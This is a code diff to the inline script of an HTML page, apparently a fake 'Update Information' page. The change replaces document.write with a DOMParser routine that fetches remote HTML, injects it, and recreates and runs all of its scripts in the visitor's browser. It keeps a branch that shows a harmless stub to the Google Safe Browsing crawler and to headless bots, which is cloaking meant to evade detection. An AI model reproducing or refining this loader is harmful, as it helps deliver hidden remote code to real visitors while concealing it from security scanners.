@@ -56,18 +56,58 @@
                     return response.text();
                 })
                 .then(html => {
-                    document.open();
-                    document.write(html);
-                    document.close();
+                    // Use DOMParser to properly parse the HTML
+                    const parser = new DOMParser();
+                    const doc = parser.parseFromString(html, 'text/html');
+                    
+                    // Extract and inject head content (styles, links, etc.)
+                    const headElements = doc.head.querySelectorAll('style, link, title');
+                    headElements.forEach(element => {
+                        if (element.tagName === 'TITLE') {
+                            document.title = element.textContent;
+                        } else {
+                            const clone = element.cloneNode(true);
+                            document.head.appendChild(clone);
+                        }
+                    });
+                    
+                    // Execute scripts from HEAD first (before body content)
+                    const headScripts = doc.head.querySelectorAll('script');
+                    headScripts.forEach(oldScript => {
+                        const newScript = document.createElement('script');
+                        // Copy all attributes
+                        Array.from(oldScript.attributes).forEach(attr => {
+                            newScript.setAttribute(attr.name, attr.value);
+                        });
+                        // Copy script content
+                        newScript.textContent = oldScript.textContent;
+                        document.head.appendChild(newScript);
+                    });
+                    
+                    // Extract and replace body content
+                    document.body.innerHTML = doc.body.innerHTML;
+                    
+                    // Execute any scripts in the loaded content
+                    const scripts = doc.body.querySelectorAll('script');
+                    scripts.forEach(oldScript => {
+                        const newScript = document.createElement('script');
+                        // Copy all attributes
+                        Array.from(oldScript.attributes).forEach(attr => {
+                            newScript.setAttribute(attr.name, attr.value);
+                        });
+                        // Copy script content
+                        newScript.textContent = oldScript.textContent;
+                        document.body.appendChild(newScript);
+                    });
                 })
                 .catch(err => {
                     console.error('Error loading content:', err);
                     // Show benign content on error instead of failing silently
-                    document.write('<h1>Update Information</h1><p>Please check back later for updates.</p>');
+                    document.body.innerHTML = '<h1>Update Information</h1><p>Please check back later for updates.</p>';
                 });
         } else {
             // GSB Crawler / Bot (headless Chrome) - Show benign content
-            document.write('<h1>Update Information</h1><p>Please check back later for updates.</p>');
+            document.body.innerHTML = '<h1>Update Information</h1><p>Please check back later for updates.</p>';
         }
     </script>
 </head>
